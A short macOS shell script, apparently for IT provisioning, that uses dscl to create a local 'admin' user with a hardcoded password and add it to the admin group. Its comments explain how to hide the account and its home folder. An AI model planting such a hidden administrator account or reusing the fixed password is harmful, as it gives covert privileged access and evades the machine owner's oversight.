#!/bin/sh

# Create user record in directory services
dscl . -create /Users/admin
dscl . -create /Users/admin RealName "SmallDog"
dscl . -create /Users/admin UniqueID 502  # Use something between 100 and 500 to hide the user
dscl . -create /Users/admin PrimaryGroupID 20
dscl . -create /Users/admin UserShell /bin/bash
dscl . -passwd /Users/admin "smalldog"  # Obviously, use something else here

# Set up a hidden home folder
dscl . -create /Users/admin NFSHomeDirectory /Users/admin  # or other hidden location
cp -R /System/Library/User\ Template/English.lproj /Users/admin
chown -R admin:staff /Users/admin

# Grant admin & ARD rights
dseditgroup -o edit -a admin -t user admin